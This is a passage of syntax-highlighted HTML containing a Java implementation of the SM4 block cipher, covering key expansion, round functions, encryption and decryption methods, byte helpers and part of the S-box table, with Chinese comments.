comment">//盒变换输入输出</span>        <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">FK</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xa3b1bac6</span><span class="token punctuation">,</span> <span class="token number">0x56aa3350</span><span class="token punctuation">,</span> <span class="token number">0x677d9197</span><span class="token punctuation">,</span> <span class="token number">0xb27022dc</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">CK</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token number">0x00070e15</span><span class="token punctuation">,</span> <span class="token number">0x1c232a31</span><span class="token punctuation">,</span> <span class="token number">0x383f464d</span><span class="token punctuation">,</span> <span class="token number">0x545b6269</span><span class="token punctuation">,</span>                <span class="token number">0x70777e85</span><span class="token punctuation">,</span> <span class="token number">0x8c939aa1</span><span class="token punctuation">,</span> <span class="token number">0xa8afb6bd</span><span class="token punctuation">,</span> <span class="token number">0xc4cbd2d9</span><span class="token punctuation">,</span>                <span class="token number">0xe0e7eef5</span><span class="token punctuation">,</span> <span class="token number">0xfc030a11</span><span class="token punctuation">,</span> <span class="token number">0x181f262d</span><span class="token punctuation">,</span> <span class="token number">0x343b4249</span><span class="token punctuation">,</span>                <span class="token number">0x50575e65</span><span class="token punctuation">,</span> <span class="token number">0x6c737a81</span><span class="token punctuation">,</span> <span class="token number">0x888f969d</span><span class="token punctuation">,</span> <span class="token number">0xa4abb2b9</span><span class="token punctuation">,</span>                <span class="token number">0xc0c7ced5</span><span class="token punctuation">,</span> <span class="token number">0xdce3eaf1</span><span class="token punctuation">,</span> <span class="token number">0xf8ff060d</span><span class="token punctuation">,</span> <span class="token number">0x141b2229</span><span class="token punctuation">,</span>                <span class="token number">0x30373e45</span><span class="token punctuation">,</span> <span class="token number">0x4c535a61</span><span class="token punctuation">,</span> <span class="token number">0x686f767d</span><span class="token punctuation">,</span> <span class="token number">0x848b9299</span><span class="token punctuation">,</span>                <span class="token number">0xa0a7aeb5</span><span class="token punctuation">,</span> <span class="token number">0xbcc3cad1</span><span class="token punctuation">,</span> <span class="token number">0xd8dfe6ed</span><span class="token punctuation">,</span> <span class="token number">0xf4fb0209</span><span class="token punctuation">,</span>                <span class="token number">0x10171e25</span><span class="token punctuation">,</span> <span class="token number">0x2c333a41</span><span class="token punctuation">,</span> <span class="token number">0x484f565d</span><span class="token punctuation">,</span> <span class="token number">0x646b7279</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//将输入的密钥每32比特合并，并异或FK</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token constant">FK</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//32轮密钥拓展</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            box_in <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token constant">CK</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            box_out <span class="token operator">=</span> <span class="token function">sBox</span><span class="token punctuation">(</span>box_in<span class="token punctuation">)</span><span class="token punctuation">;</span>            key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_out <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> key_r<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 加解密主模块 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sm4Main</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_r<span class="token punctuation">,</span> <span class="token keyword">int</span> mod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//32比特字</span>        <span class="token comment">//将输入以32比特分组</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> box_input<span class="token punctuation">,</span> box_output<span class="token punctuation">;</span><span class="token comment">//盒变换输入和输出</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>mod <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> i <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过改变key_r的顺序改变模式</span>            box_input <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> text<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> text<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_r<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            box_output <span class="token operator">=</span> <span class="token function">sBox</span><span class="token punctuation">(</span>box_input<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_output <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//输出</span>        <span class="token comment">//将结果的32比特字拆分</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span><span class="token function">splitInt</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> output<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 加密 */</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">sm4Main</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key_r<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 解密 */</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">sm4Main</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key_r<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 将32比特数拆分成4个8比特数 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">splitInt</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">>>></span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">>>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> n<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 将4个8比特数合并成32比特数 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span><span class="token keyword">byte</span> byte_0<span class="token punctuation">,</span> <span class="token keyword">byte</span> byte_1<span class="token punctuation">,</span> <span class="token keyword">byte</span> byte_2<span class="token punctuation">,</span> <span class="token keyword">byte</span> byte_3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte_0 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte_1 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte_2 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>byte_3 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">/* S盒变换 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sBox</span><span class="token punctuation">(</span><span class="token keyword">int</span> box_input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//s盒的参数</span>        <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">SBOX</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>                <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span>                <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span>                <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span>                <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span>                <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>                <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span>                <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span>                <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>                <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span>                <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span>                <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span>                <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token 